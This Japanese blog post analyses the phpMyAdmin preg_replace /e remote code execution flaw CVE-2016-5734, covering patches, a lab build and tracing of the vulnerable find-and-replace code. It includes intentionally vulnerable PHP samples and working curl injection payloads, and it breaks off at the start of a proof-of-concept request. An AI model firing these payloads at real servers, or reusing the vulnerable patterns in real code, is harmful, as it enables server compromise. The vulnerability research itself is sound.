---
layout: post
title:  "CVE-2016-5734 phpMyAdminに任意のコマンドの実行可能な脆弱性"
date:   2016-07-19 00:00:00 +0900
categories: vlunnerability
toc: true
---

## 概要

phpMyAdminの4.0系の4.0.10.16未満、4.4系の4.4.15.7未満、4.6系の4.6.3未満のバージョンにはpreg_replaceの[デリミタ](http://php.net/manual/ja/regexp.reference.delimiters.php)を適切に選択しないため、攻撃者はリモートから任意のコマンドのPHPコードを注入することができます。これはテーブルの検索と置換の実装に起因します。

## CVSS v3

|CVSS v3 Base Score|9.8 Critical|
|Vector|CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H|
|Impact Score| 5.9|
|Exploitability Score| 3.9|
|Attack Vector (AV)| Network|
|Attack Complexity (AC)| Low|
|Privileges Required (PR)| None|
|User Interaction (UI)| None|
|Scope (S)| Unchanged|
|Confidentiality (C)| High|
|Integrity (I)| High|
|Availability (A)| High|

## 解決策、緩和策情報

phpMyAdminのバージョンを4.6.3, 4.4.15.7, 4.0.10.16以上にアップグレードするか、以下のパッチを適用してください。

 * 4.0系
   * [351019c](https://github.com/phpmyadmin/phpmyadmin/commit/351019c)
 * 4.4系
   * [33d1373](https://github.com/phpmyadmin/phpmyadmin/commit/33d1373)
   * [daf3751](https://github.com/phpmyadmin/phpmyadmin/commit/daf3751)
 * 4.6系
   * [4bcc606](https://github.com/phpmyadmin/phpmyadmin/commit/4bcc606)
   * [1cc7466](https://github.com/phpmyadmin/phpmyadmin/commit/1cc7466)

## 影響を受けるphpMyAdminのバージョン

 * 4.0系
   * 4.0.10.15
   * 4.0.9
   * 4.0.8
   * 4.0.7
   * 4.0.6
   * 4.0.5
   * 4.0.4.2
   * 4.0.4.1
   * 4.0.4
   * 4.0.3
   * 4.0.2
   * 4.0.10.9
   * 4.0.10.8
   * 4.0.10.7
   * 4.0.10.6
   * 4.0.10.5
   * 4.0.10.4
   * 4.0.10.3
   * 4.0.10.2
   * 4.0.10.14
   * 4.0.10.13
   * 4.0.10.12
   * 4.0.10.11
   * 4.0.10.10
   * 4.0.10.1
   * 4.0.10
   * 4.0.1
   * 4.0.0
 * 4.4系
   * 4.4.15.6
   * 4.4.15.5
   * 4.4.9
   * 4.4.8
   * 4.4.7
   * 4.4.6.1
   * 4.4.6
   * 4.4.5
   * 4.4.4
   * 4.4.3
   * 4.4.2
   * 4.4.15.4
   * 4.4.15.3
   * 4.4.15.2
   * 4.4.15.1
   * 4.4.15
   * 4.4.14.1
   * 4.4.13.1
   * 4.4.13
   * 4.4.12
   * 4.4.11
   * 4.4.10
   * 4.4.1.1
   * 4.4.1
   * 4.4.0
 * 4.6系
   * 4.6.0:rc2
   * 4.6.0:rc1
   * 4.6.0:alpha1
   * 4.6.2
   * 4.6.1
   * 4.6.0

## 技術的な詳細

### 前提知識

evalのような文字列を再評価処理を行う関数に外部から汚染可能な値を渡すと任意のコマンドの実行が可能な脆弱性ができてしまいます。

 * 外部入力を無害化することなしに再評価処理する脆弱なスクリプト

```php
<?php
eva($_GET['input']);
?>
```

 * 任意のコマンドの実行が可能

```bash
$ curl -X GET "http://vlun.test/test.php?input=system('hostname');"
vlun.test
```

再評価といえばevalですが、正規表現と置換処理を担うpreg_replace関数もeオプションを使用することで文字列再評価を行う機能を持っています。この機能はphp 5.5.0で非推奨の機能となり、php 7.0.0で使えなくなっています。またphp 5.5.0以降ではE_DEPRECATEDの例外が発生し、PHP 7.0.0以降ではE_WARNINGの例外が発生します。また、php 5.4.6まではpreg_replaceにNULL終端攻撃を実行することが可能です。

 * 外部入力を無害化することなしに再評価処理する脆弱なスクリプト

```php
<?php
preg_replace('/.*/e', $_GET['input'], '')
?>
```

 * 任意のコマンドの実行が可能

```bash
$ curl -X GET "http://vlun.test/test.php?input=system('hostname');"
vlun.test
```

次は本件の脆弱性で問題になっている[デリミタ](http://php.net/manual/ja/regexp.reference.delimiters.php)に着目してpreg_replaceの再評価処理をみていきましょう。

 * 正規表現パターンと置き換え文字列を外部入力から渡す

```php
<?php
preg_replace($_GET['input1'], $_GET['input2'], '')
?>
```

 * 任意のコマンドの実行が可能

```bash
$ curl -X GET "http://vlun.test/test.php?input1=/.*/e&input2=system('uname+-a');"
Linux vlun.test 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2+deb8u3 (2016-07-02) x86_64 GNU/Linux
```

正規表現の完全なパターン渡して任意のコマンドの実行を起こすことが可能なのがわかりました。
次に一部だけ正規表現が定義されている場合をみてみましょう。

 * デリミタを @ で設定し、前半のデリミタだけを指定する

```php
<?php
preg_replace('@' . $_GET['input1'], $_GET['input2'], '')
?>
```

 * 後半のデリミタとeオプションを設定して、任意のコマンドの実行を行う

```bash
$ curl -X GET "http://vlun.test/test.php?input1=.*@e&input2=system('uname+-a');"
Linux vlun.test 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2+deb8u3 (2016-07-02) x86_64 GNU/Linux
```

 * デリミタが始点と終点も支持されている

```php
<?php
preg_replace('@' . $_GET['input1'] . '@', $_GET['input2'], '')
?>
```

 * NULL終端文字列を渡して、終点のデリミタを無効にする。

```bash
$ curl -X GET "http://vlun.test/test.php?input1=.*@e%00&input2=system('uname+-a');"
Linux vlun.test 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux
```

前途の通り、NULL終端攻撃はPHP 5.4.6以前しか使うことはできません。

第３パラメータはどのような値が入っていても任意のコマンドは実行します。

```php
<?php
preg_replace('@' . $_GET['input1'] . '@', $_GET['input2'], 'XXX')
?>
```

```bash
$ curl -X GET "http://vlun.test/test.php?input1=.*@e%00&input2=system('uname+-a');"

Linux vlun.test 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux
Linux vlun.test 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux
```

POSTの例も見ておきましょう。

```php
<?php
preg_replace('@' . $_POST['input1'] . '@', $_POST['input2'], 'XXX')
?>

<!DOCTYPE html>
<html lang = “ja”>
<head>
<meta charset = “UFT-8”>
<title>post test</title>
</head>
<body>
<h1>post test</h1>
<form action = "test.php" method = "post">
<input type = "text" name ="input1"><br/>
<input type = "text" name ="input2"><br/>
<input type = "submit" value ="post">
</form>
</body>
</html>
```

```
$ curl -d 'input1=.*%40e%00&input2=system%28%27hostname%27%29%3B' http://vlun.test/test.php

vlun.test
vlun.test

<!DOCTYPE html>
<html lang = “ja”>
<head>
<meta charset = “UFT-8”>
<title>post test</title>
</head>
<body>
<h1>post test</h1>
<form action = "test.php" method = "post">
<input type = "text" name ="input1"><br/>
<input type = "text" name ="input2"><br/>
<input type = "submit" value ="post">
</form>
</body>
</html>
```

### 検証環境構築

#### vagrnt snapshotの導入

検証環境はvagrantで構築しています。環境をよく壊してしまいますので、vagrantでsnapshotをとっておいて不測の事態に備えます。
使い方は[takuan_oshoさんのqiita](http://qiita.com/takuan_osho/items/682b776b41989f0b016f)を参考にしました。

#### ApacheとPHPとMySQL環境の構築

phpMyAdminの4.0.10.15を検証対象として、検証環境を構築します。
phpMyAdminの検証にはLAMP環境(Apache,MySQL,PHP)が必要です。また今回の脆弱性はNULL終端攻撃ができるVersionのPHPのほうが攻撃しやすそうなので、PHPはバージョン5.4.6以下を使います。
[PHPの公式](http://php.net/manual/ja/install.unix.apache2.php)ページと[ksugawara61さんのqiita](http://qiita.com/ksugawara61/items/70f5d1faf192c4ba6ca0)を参考に環境を構築していきます。

 * APR(Apache Protable Runtime)のインストール 

```
$ wget http://ftp.yz.yamagata-u.ac.jp/pub/network/apache//apr/apr-1.5.2.tar.gz
$ tar zxvf apr-1.5.2.tar.gz
$ cd apr-1.5.2
$ ./configure --prefix=/opt/apr-1.5.2
$ make
$ sudo make install
```

 * APR-Utilのインストール

```
$ wget http://ftp.yz.yamagata-u.ac.jp/pub/network/apache//apr/apr-util-1.5.4.tar.gz
$ tar zxvf apr-util-1.5.4.tar.gz
$ cd apr-util-1.5.4
$ ./configure --prefix=/opt/apr-util-1.5.4 --with-apr=/opt/apr-1.5.2
$ make
$ sudo make install
```

 * PCRE(Perl Compatible Regular Expressions)のインストール

```
$ wget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.39.tar.gz
$ tar zxvf pcre-8.39.tar.gz
$ cd pcre-8.39
$ ./configure --prefix=/opt/pcre-8.37
$ make
$ sudo make install
```

 * Apacheのインストール

```
$ wget http://ftp.tsukuba.wide.ad.jp/software/apache//httpd/httpd-2.4.23.tar.gz
$ tar zxvf httpd-2.4.23.tar.gz
$ cd httpd-2.4.23
$ ./configure --with-apr=/opt/apr-1.5.2 --with-apr-util=/opt/apr-util-1.5.4 --with-pcre=/opt/pcre-8.37
$ make
$ sudo make install
$ /usr/local/apache2/bin/httpd -v
Server version: Apache/2.4.23 (Unix)
Server built:   Jul 14 2016 12:52:16
```

 * PHP5.4.6

```
$ sudo apt-get install libxml2-dev
$ wget http://museum.php.net/php5/php-5.4.6.tar.gz
$ tar zxvf php-5.4.6.tar.gz
$ cd php-5.4.6
$ ./configure --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql --enable-mbstring --enable-embedded-mysqli
$ make
```

以下のエラーが発生しました。

```
/home/kosuke/php-5.4.6/ext/dom/node.c: In function ‘dom_canonicalization’:
/home/kosuke/php-5.4.6/ext/dom/node.c:1898:21: error: dereferencing pointer to incomplete type
    ret = buf->buffer->use;
                     ^
In file included from /home/kosuke/php-5.4.6/main/php.h:38:0,
                 from /home/kosuke/php-5.4.6/ext/dom/node.c:26:
/home/kosuke/php-5.4.6/ext/dom/node.c:1900:40: error: dereferencing pointer to incomplete type
     RETVAL_STRINGL((char *) buf->buffer->content, ret, 1);
                                        ^
/home/kosuke/php-5.4.6/Zend/zend_API.h:571:20: note: in definition of macro ‘ZVAL_STRINGL’
   const char *__s=(s); int __l=l;   \
                    ^
/home/kosuke/php-5.4.6/ext/dom/node.c:1900:5: note: in expansion of macro ‘RETVAL_STRINGL’
     RETVAL_STRINGL((char *) buf->buffer->content, ret, 1);
     ^
Makefile:575: recipe for target 'ext/dom/node.lo' failed
make: *** [ext/dom/node.lo] Error 1
```

[githubのissuel](https://github.com/phpbrew/phpbrew/issues/249)により、以下のパッチで改善されることを確認しました。

```
$ curl -s https://mail.gnome.org/archives/xml/2012-August/txtbgxGXAvz4N.txt | patch -p0
$ make
$ sudo make install
$ php --version
PHP 5.4.6 (cli) (built: Jul 14 2016 14:08:12)
Copyright (c) 1997-2012 The PHP Group
Zend Engine v2.4.0, Copyright (c) 1998-2012 Zend Technologies
$ sudo cp php.ini-development /usr/local/lib/php.ini
```

ApacheからPHPを使うために/usr/local/apache2/conf/httpd.confに以下の設定を追加します。

```
LoadModule php5_module        modules/libphp5.so
```

```
<FilesMatch \.php$>
    SetHandler application/x-httpd-php
</FilesMatch>
```

MySQLはVersionを特に考える必要はないので、aptで入れました。

```
$ sudo apt-get install mysql-server
```

### Xdebugで調査

tracelogを得られば問題の該当箇所を素早く見つけられると思うので、xdebugを導入してtracelogを得ます。

```
$ sudo apt-get install autoconf
$ pecl install xdebug
(snip)
Build process completed successfully
Installing '/usr/local/lib/php/extensions/no-debug-zts-20100525/xdebug.so'
install ok: channel://pecl.php.net/xdebug-2.4.0
configuration option "php_ini" is not set to php.ini location
You should add "zend_extension_ts=xdebug.so" to php.ini
```

php.iniにxdebugの設定を書き込み、xdebugが有効になっていることを確認しました。

```
$ cat > /usr/local/lib/php.ini
zend_extension=/usr/local/lib/php/extensions/no-debug-zts-20100525/xdebug.so
auto_prepend_file = /usr/local/apache2/htdocs/prepend.php
auto_append_file = /usr/local/apache2/htdocs/append.php
xdebug.collect_return = 1
xdebug.collect_params = 4
xdebug.collect_assignments = 1
xdebug.var_display_max_data = 100000
xdebug.var_display_max_depth = 100000
xdebug.trace_format = 1
memory_limit = 256M
CTRL+C
$ php -i | grep xdebug | head
xdebug support => enabled
```

任意のファイルにtracelogを書き出すために、実行前と実行後に処理を行うphpスクリプトを作成します。

 * prepend.php

```php
<?php
$VLUN_TEST_TRACELOG_DIR = "/tmp/tracelog/";
$VLUN_TEST_EXEC_FILENAME = basename($_SERVER['PHP_SELF']);
$VLUN_TEST_TIME = time();
$VLUN_TRACE_FILEPATH = "${VLUN_TEST_TRACELOG_DIR}/${VLUN_TEST_EXEC_FILENAME}_${VLUN_TEST_TIME}";
xdebug_start_trace( $VLUN_TRACE_FILEPATH );
?>
```

 * append.php

```php
<?php
xdebug_stop_trace();
?>
```

この時にphpinfo.phpにアクセスすると/tmp/tracelog/phpinfo.php_1468546417.xtが生成されます。

```bash
root@vlun:/usr/local/apache2/htdocs# cat /tmp/tracelog/phpinfo.php_1468546417.xt
Version: 2.4.0
File format: 4
TRACE START [2016-07-15 01:33:37]
2       3       1       0.000155        235160
1       0       1       0.000164        235096
1       4       0       0.000190        233368  {main}  1               /usr/local/apache2/htdocs/phpinfo.php   0       0
2       5       0       0.000199        233448  phpinfo 0               /usr/local/apache2/htdocs/phpinfo.php   2       0
2       5       1       0.001031        295600
2       5       R                       TRUE
1       4       1       0.001054        295600
1       4       R                       1
1       6       0       0.001230        295872  {main}  1               /usr/local/apache2/htdocs/append.php    0       0
2       7       0       0.001242        295952  xdebug_stop_trace       0               /usr/local/apache2/htdocs/append.php    2       0
                        0.001246        296016
TRACE END   [2016-07-15 01:33:37]
```

### phpMyAdmin 4.0.10.15のインストール

Apache, PHP, MySQLが揃ったので、phpMyAdminを導入します。

```bash
$ wget https://files.phpmyadmin.net/phpMyAdmin/4.0.10.15/phpMyAdmin-4.0.10.15-all-languages.tar.gz
$ tar zxvf phpMyAdmin-4.0.10.15-all-languages.tar.gz
$ sudo mkdir /usr/local/apache2/htdocs/phpmyadmin4.0 
$ sudo cp -r phpMyAdmin-4.0.10.15-all-languages/* /usr/local/apache2/htdocs/phpmyadmin
$ sudo /usr/local/apache2/bin/apachectl start
```

あとはhttp://vlun.test/phpmyadmin4.0/にアクセスして、mysqlのrootアカウントでログインできました。

![phpmyadmin_login]({{site.baseurl}}/images/2016/07/13/phpmyadmin_login.png)

検証のデータベースとテーブルも作成しておきます。

```sql
CREATE DATABASE vlun_test;
CREATE TABLE vlun_test.test(id int, msg varchar(20));
INSERT INTO vlun_test.test (id, msg) values(1, 'AAA');
INSERT INTO vlun_test.test (id, msg) values(2, 'BBB');
INSERT INTO vlun_test.test (id, msg) values(3, 'CCC');
```

以下のようなテーブルとレコードが作成されます。

```
mysql> select * from vlun_test.test;
+------+------+
| id   | msg  |
+------+------+
|    1 | AAA  |
|    2 | BBB  |
|    3 | CCC  |
+------+------+
3 rows in set (0.00 sec)
```

この調子でphpMyAdmin4.4系とphpMyAdmin4.6系もインストールしておくことにします。本当に検証したいのはphpMyAdmin4.0系ですが、4.0系の問題を別の始点から観察するために他にversionも見てみます。

### phpMyAdmin4.4.15.6のインストール

```
$ wget https://files.phpmyadmin.net/phpMyAdmin/4.4.15.6/phpMyAdmin-4.4.15.6-all-languages.tar.gz
$ tar zxvf phpMyAdmin-4.4.15.6-all-languages.tar.gz
$ sudo mkdir /usr/local/apache2/htdocs/phpmyadmin4.4
$ sudo cp -r phpMyAdmin-4.4.15.6-all-languages/* /usr/local/apache2/htdocs/phpmyadmin4.4/
```

### phpMyAdmin4.6.2のインストール

```
wget https://files.phpmyadmin.net/phpMyAdmin/4.6.2/phpMyAdmin-4.6.2-all-languages.tar.gz
tar zxvf phpMyAdmin-4.6.2-all-languages.tar.gz
sudo mkdir /usr/local/apache2/htdocs/phpmyadmin4.6
sudo cp -r phpMyAdmin-4.6.2-all-languages/* /usr/local/apache2/htdocs/phpmyadmin4.6/
```

phpMyAdmin4.6.2はphp5.5+以上が必要なようで、NULL終端攻撃が使えるPHP5.4.6では動作しませんでした。

### snapshotの作成

この時点でのsnapshotをとっておくことにします。

```bash
$ vagrant snapshot take install_all_phpmyadmin
Taking snapshot install_all_phpmyadmin
0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
Snapshot taken. UUID: 47ef0bd2-1a59-4b94-82c5-b4ad718688c8
$ vagrant snapshot list
Listing snapshots for 'default':
   Name: clean (UUID: 6a00cc14-4d38-40a5-815e-218a7d557b12)
      Name: phpmyadmin_4.0.10.15_on_php_5.4.6 (UUID: 1148b139-fa09-4a61-b586-d20bc7c83ffc)
         Name: install_all_phpmyadmin (UUID: 47ef0bd2-1a59-4b94-82c5-b4ad718688c8) *
```

### phpMyAdmin4.0.10.15に関わる技術的な調査

phpMyAdmin4.0.10.15で修正されたコードは[351019c](https://github.com/phpmyadmin/phpmyadmin/commit/351019c)です。[preg_quote](http://php.net/manual/ja/function.preg-quote.php)にデリミタとして使用する文字を加えて、その文字もエスケープしています。
この処理はavailable_mime変数に対して処理を行っています。この変数はphpMyAdminの[変換機能](http://docs.phpmyadmin.net/ja/latest/transformations.html)に関わるもののようです。よって変換機能を拡張機能でして、有効化しないとこの脆弱性は発現することはないと考えられます。この機能はデフォルトでは無効化されていますので、config.inc.phpで$cfg['Servers'][$i]['column_info'] = 'pma__column_info';を有効化しないと変換機能は動作しません。

最初にこの変数は配列として宣言されます。

```php
$available_mime = array();
$mime_map = array();
```

次にPMA_getMIME関数でmime_map変数の、PMA_getAvailableMIMEtypes関数でavailable_mime変数の値を作成しています。

```php
if ($cfgRelation['mimework'] && $GLOBALS['cfg']['BrowseMIME']) { 
    $mime_map = PMA_getMIME($db, $table);                        
    $available_mime = PMA_getAvailableMIMEtypes();               
```

PMA_getMIME関数は以下のように定義されていますので、column_infoテーブルがないと動作しません。

```php
/**                                                                           
 * Gets the mimetypes for all columns of a table                              
 *                                                                            
 * @param string $db     the name of the db to check for                      
 * @param string $table  the name of the table to check for                   
 * @param string $strict whether to include only results having a mimetype set
 *                                                                            
 * @access  public                                                            
 *                                                                            
 * @return array [field_name][field_key] = field_value                        
 */                                                                           
function PMA_getMIME($db, $table, $strict = false)                            
{                                                                             
    $cfgRelation = PMA_getRelationsParam();                                   
                                                                              
    if (! $cfgRelation['commwork']) {                                         
        return false;                                                         
    }                                                                         
                                                                              
    $com_qry  = '                                                        
         SELECT `column_name`,                                           
                `mimetype`,                                              
                `transformation`,                                        
                `transformation_options`                                 
         FROM ' . PMA_Util::backquote($cfgRelation['db']) . '.'          
        . PMA_Util::backquote($cfgRelation['column_info']) . '           
         WHERE `db_name`    = \'' . PMA_Util::sqlAddSlashes($db) . '\'   
           AND `table_name` = \'' . PMA_Util::sqlAddSlashes($table) . '\'
           AND ( `mimetype` != \'\'' . (!$strict ? '                     
              OR `transformation` != \'\'                                
              OR `transformation_options` != \'\'' : '') . ')';          
    $result = PMA_DBI_fetch_result(                                      
        $com_qry, 'column_name', null, $GLOBALS['controllink']           
    );                                                                   
                                                                         
    foreach ($result as $column => $values) {                            
        // replacements in mimetype and transformation                   
        $values = str_replace("jpeg", "JPEG", $values);                  
        $values = str_replace("png", "PNG", $values);                    
        $values = str_replace("octet-stream", "Octetstream", $values);   
                                                                         
        // convert mimetype to new format (f.e. Text_Plain, etc)         
        $delimiter_space = '- ';                                         
        $delimiter = "_";                                                
        $values['mimetype'] = str_replace(                               
            $delimiter_space,                                            
            $delimiter,                                                  
            ucwords(                                                     
                str_replace(                                             
                    $delimiter,                                          
                    $delimiter_space,                                    
                    $values['mimetype']                                  
                )                                                        
            )                                                            
        );                                                               
                                                                         
        // convert transformation to new format (class name)     
        // f.e. Text_Plain_Substring.class.php                   
        $values = str_replace("__", "_", $values);               
        $values = str_replace(".inc.php", ".class.php", $values);
                                                                 
        $values['transformation'] = str_replace(                 
            $delimiter_space,                                    
            $delimiter,                                          
            ucwords(                                             
                str_replace(                                     
                    $delimiter,                                  
                    $delimiter_space,                            
                    $values['transformation']                    
                )                                                
            )                                                    
        );                                                       
                                                                 
        $result[$column] = $values;                              
    }                                                            
                                                                 
    return $result;                                              
} // end of the 'PMA_getMIME()' function                         
```

私が検証すべきphpMyAdminはこの変換機能を有効化していませんでしたので、本脆弱性の影響はないと判断しましたが、技術的な興味のために変換機能を有効化してみます。

 * 拡張機能に必要なテーブルの作成

```
mysql> source /usr/local/apache2/htdocs/phpmyadmin4.0/examples/create_tables.sql
Query OK, 1 row affected (0.05 sec)

Database changed
Query OK, 0 rows affected (0.17 sec)
Query OK, 0 rows affected (0.03 sec)
Query OK, 0 rows affected (0.01 sec)
(snip)
Query OK, 0 rows affected (0.01 sec)
Query OK, 0 rows affected (0.01 sec)
Query OK, 0 rows affected (0.00 sec)

mysql> GRANT ALL ON phpmyadmin.* TO pma@localhost IDENTIFIED BY "pmapass";
Query OK, 0 rows affected (0.10 sec)
```

 * config.inc.phpを編集して変換機能を含む拡張機能を有効化

```
/* User used to manipulate with storage */
$cfg['Servers'][$i]['controlhost'] = '';
$cfg['Servers'][$i]['controluser'] = 'pma';
$cfg['Servers'][$i]['controlpass'] = 'pmapass';
$cfg['Servers'][$i]['pmadb'] = 'phpmyadmin';
$cfg['Servers'][$i]['column_info'] = 'pma__column_info';
$cfg['Servers'][$i]['bookmarktable'] = 'pma__bookmark';
$cfg['Servers'][$i]['relation'] = 'pma__relation';
$cfg['Servers'][$i]['table_info'] = 'pma__table_info';
$cfg['Servers'][$i]['table_coords'] = 'pma__table_coords';
$cfg['Servers'][$i]['pdf_pages'] = 'pma__pdf_pages';
$cfg['Servers'][$i]['history'] = 'pma__history';
$cfg['Servers'][$i]['table_uiprefs'] = 'pma__table_uiprefs';
$cfg['Servers'][$i]['tracking'] = 'pma__tracking';
$cfg['Servers'][$i]['designer_coords'] = 'pma__designer_coords';
$cfg['Servers'][$i]['userconfig'] = 'pma__userconfig';
$cfg['Servers'][$i]['recent'] = 'pma__recent';
/* Contrib / Swekey authentication */
$cfg['Servers'][$i]['auth_swekey_config'] = '/etc/swekey-pma.conf';
```

変換機能はテーブルの構造タブから変更ボタンを押すことで利用することができます。

 * 拡張機能設定前の状態

![phpmyadmin_login]({{site.baseurl}}/images/2016/07/13/phpmyadmin_pre_extend.png)

 * 拡張機能設定後の状態

![phpmyadmin_login]({{site.baseurl}}/images/2016/07/13/phpmyadmin_after_extend.png)

MIMEタイプ、ブラウザ変換機能、変換オプションが増えているのがわかります。
ここに脆弱性があるとのことですが、確かに修正箇所のロジックを通るのはわかりますが、修正された正規表現はpreg_matchに与えられており、preg_replaceに入る箇所を見つけることができませんでした。
なので、実証検証が世にでるまでは私はCVE-2016-5734がphpMyAdminの4.0系で本当に任意のコマンドの実行ができるという発表には懐疑的です。

### phpMyAdmin4.4.15.6に関わる技術的な調査

phpMyAdmin4.4系に関わる修正コミットは[33d1373](https://github.com/phpmyadmin/phpmyadmin/commit/33d1373)と[daf3751](https://github.com/phpmyadmin/phpmyadmin/commit/daf3751)です。

```php
    /**
     * Finds and returns Regex pattern and their replacements
     *
     * @param int    $columnIndex index of the column
     * @param string $find        string to find in the column
     * @param string $replaceWith string to replace with
     * @param string $charSet     character set of the connection
     *
     * @return array Array containing original values, replaced values and count
     */
    function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)
    {
        $column = $this->_columnNames[$columnIndex];
        $sql_query = "SELECT "
            . PMA_Util::backquote($column) . ","
            . " 1," // to add an extra column that will have replaced value
            . " COUNT(*)"
            . " FROM " . PMA_Util::backquote($this->_db)
            . "." . PMA_Util::backquote($this->_table)
            . " WHERE " . PMA_Util::backquote($column)
            . " RLIKE '" . PMA_Util::sqlAddSlashes($find) . "' COLLATE "
            . $charSet . "_bin"; // here we
            // change the collation of the 2nd operand to a case sensitive
            // binary collation to make sure that the comparison is case sensitive
        $sql_query .= " GROUP BY " . PMA_Util::backquote($column)
            . " ORDER BY " . PMA_Util::backquote($column) . " ASC";

        $result = $GLOBALS['dbi']->fetchResult($sql_query, 0);

        if (is_array($result)) {
            foreach ($result as $index=>$row) {
                $result[$index][1] = preg_replace(
                    "/" . $find . "/",
                    $replaceWith,
                    $row[0]
                );
            }
        }
        return $result;
    }
```

_getRegexReplaceRows関数を呼んでいるのははTableSearch.class.php自身です。

```
kosuke@chaos ~/phpMyAdmin-4.4.15.6-all-languages $ grep -rn _getRegexReplaceRows *
libraries/TableSearch.class.php:1388:    function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)
libraries/TableSearch.class.php:1435:            $result = $this->_getRegexReplaceRows(
libraries/TableSearch.class.php:1528:            $toReplace = $this->_getRegexReplaceRows(
```

getReplacePreview関数の中で_getRegexReplaceRow関数が呼ばれています。

```
    /**
     * Returns HTML for previewing strings found and their replacements
     *
     * @param int     $columnIndex index of the column
     * @param string  $find        string to find in the column
     * @param string  $replaceWith string to replace with
     * @param boolean $useRegex    to use Regex replace or not
     * @param string  $charSet     character set of the connection
     *
     * @return string HTML for previewing strings found and their replacements
     */
    function getReplacePreview($columnIndex, $find, $replaceWith, $useRegex,
        $charSet
    ) {
        $column = $this->_columnNames[$columnIndex];
        if ($useRegex) {
            $result = $this->_getRegexReplaceRows(
                $columnIndex, $find, $replaceWith, $charSet
            );
        } else {
            $sql_query = "SELECT "
                . PMA_Util::backquote($column) . ","
                . " REPLACE("
                . PMA_Util::backquote($column) . ", '" . $find . "', '"
                . $replaceWith
                . "'),"
                . " COUNT(*)"
                . " FROM " . PMA_Util::backquote($this->_db)
                . "." . PMA_Util::backquote($this->_table)
                . " WHERE " . PMA_Util::backquote($column)
                . " LIKE '%" . $find . "%' COLLATE " . $charSet . "_bin"; // here we
                // change the collation of the 2nd operand to a case sensitive
                // binary collation to make sure that the comparison
                // is case sensitive
            $sql_query .= " GROUP BY " . PMA_Util::backquote($column)
                . " ORDER BY " . PMA_Util::backquote($column) . " ASC";

            $result = $GLOBALS['dbi']->fetchResult($sql_query, 0);
        }

        $htmlOutput = '<form method="post" action="tbl_find_replace.php"'
            . ' name="previewForm" id="previewForm" class="ajax">';
        $htmlOutput .= PMA_URL_getHiddenInputs($this->_db, $this->_table);
        $htmlOutput .= '<input type="hidden" name="replace" value="true" />';
        $htmlOutput .= '<input type="hidden" name="columnIndex" value="'
            . $columnIndex . '" />';
        $htmlOutput .= '<input type="hidden" name="findString"'
            . ' value="' . htmlspecialchars($find) . '" />';
        $htmlOutput .= '<input type="hidden" name="replaceWith"'
            . ' value="' . htmlspecialchars($replaceWith) . '" />';
        $htmlOutput .= '<input type="hidden" name="useRegex"'
            . ' value="' . $useRegex . '" />';

        $htmlOutput .= '<fieldset id="fieldset_find_replace_preview">';
        $htmlOutput .= '<legend>' . __('Find and replace - preview') . '</legend>';

        $htmlOutput .= '<table id="previewTable">'
            . '<thead><tr>'
            . '<th>' . __('Count') . '</th>'
            . '<th>' . __('Original string') . '</th>'
            . '<th>' . __('Replaced string') . '</th>'
            . '</tr></thead>';

        $htmlOutput .= '<tbody>';
        $odd = true;
        if (is_array($result)) {
            foreach ($result as $row) {
                $val = $row[0];
                $replaced = $row[1];
                $count = $row[2];

                $htmlOutput .= '<tr class="' . ($odd ? 'odd' : 'even') . '">';
                $htmlOutput .= '<td class="right">' . htmlspecialchars($count)
                    . '</td>';
                $htmlOutput .= '<td>' . htmlspecialchars($val) . '</td>';
                $htmlOutput .= '<td>' . htmlspecialchars($replaced) . '</td>';
                $htmlOutput .= '</tr>';

                $odd = ! $odd;
            }
        }
        $htmlOutput .= '</tbody>';
        $htmlOutput .= '</table>';
        $htmlOutput .= '</fieldset>';

        $htmlOutput .= '<fieldset class="tblFooters">';
        $htmlOutput .= '<input type="submit" name="replace"'
            . ' value="' . __('Replace') . '" />';
        $htmlOutput .= '</fieldset>';

        $htmlOutput .= '</form>';
        return $htmlOutput;
    }
```

getReplacePreview関数を呼んでいるのはtbl_find_replace.phpです。

```
kosuke@chaos ~/phpMyAdmin-4.4.15.6-all-languages $ grep -rn getReplacePreview *
libraries/TableSearch.class.php:1430:    function getReplacePreview($columnIndex, $find, $replaceWith, $useRegex,
tbl_find_replace.php:24:    $preview = $table_search->getReplacePreview(
```

驚くべきことにすべての値はPOSTから受け取っています。

```
if (isset($_POST['find'])) {
    $preview = $table_search->getReplacePreview(
        $_POST['columnIndex'],
        $_POST['find'],
        $_POST['replaceWith'],
        $_POST['useRegex'],
        $connectionCharSet
    );
    $response->addJSON('preview', $preview);
    exit;
}
```

整理してみましょう。tbl_find_replace.phpが受け取るPOST値のcolumnIndex,find,
replaceWith,
useRegexはgetReplacePreview関数に渡されます。useRegex値が真だった場合、columnIndex,find,replaceWithの値は_getRegexReplaceRowsに渡され、置換対象テーブルにレコードがあった場合、以下のコードが実行されます。

```php
                $result[$index][1] = preg_replace(
                    "/" . $find . "/",
                    $replaceWith,
                    $row[0]
                );
```

findの値、replaceWithの値は無害化されておらず、NULL終端攻撃を使えば任意のコマンドの実行が可能だと見受けられます。
調査したいところにデバッグ文を入れて、動作を確認します。

```
                error_log("replaceWith = " . $replaceWith . "\n", "3","/tmp/debug.log");
                error_log("row[0] = " . $row[0] . "\n", "3","/tmp/debug.log");
                $result[$index][1] = preg_replace(
                    "/" . $find . "/",
                    $replaceWith,
                    $row[0]
                );
            }
        }
```

どうやら想定通りの挙動をしているようです。

### 概念実証

 * 任意のデータベースを作成する
 * 任意のテーブルを作成する
 * TEXT型のカラムを作成する
 * 作成したカラムに`.*/e`という値を挿入する
 * Find and Replaceタブから以下のようなクエリを作成する

```
POST /phpmyadmin4.4/tbl_find_replace.php HTTP/1.1
Host: vlun.test
Content-Length: 298
Accept: */*
Origin: http://vlun.test
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
